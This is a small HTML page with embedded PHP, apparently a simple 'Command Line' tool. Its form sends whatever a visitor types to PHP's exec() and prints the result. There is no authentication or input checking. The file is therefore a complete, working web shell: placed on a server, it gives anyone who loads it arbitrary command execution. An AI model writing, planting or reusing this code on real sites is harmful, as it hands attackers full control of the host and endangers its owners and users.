<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        * {
            box-sizing: content-box;
        }

        input{
            box-sizing: border-box;
        }

        html,
        body {
            padding: 2rem;
            background: #222;
            color: #fff;
        }

        .container {
            width: 100%;
        }

        form {
            width: 100%;
        }

        form * {
            width: 100%;
            padding: 1rem;
            margin: .8rem 0;
            font-size: 1.5rem;
            border: none;
        }

        #output {
            background: #333;
            color: #fff;
            padding: 1rem 3rem;
            font-size: 1.1rem;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Command Line</h1>
        <form method="POST">
            <input type="text" name="command" autofocus id="command">
            <input type="submit" value="Run command">
        </form>
        <div id="output">
            <?php
            if (@$command = $_POST['command']) {
                exec($command, $output);
                echo '<pre>';
                print_r($output);
                echo '</pre>';
            }
            ?>
        </div>
    </div>
</body>

</html>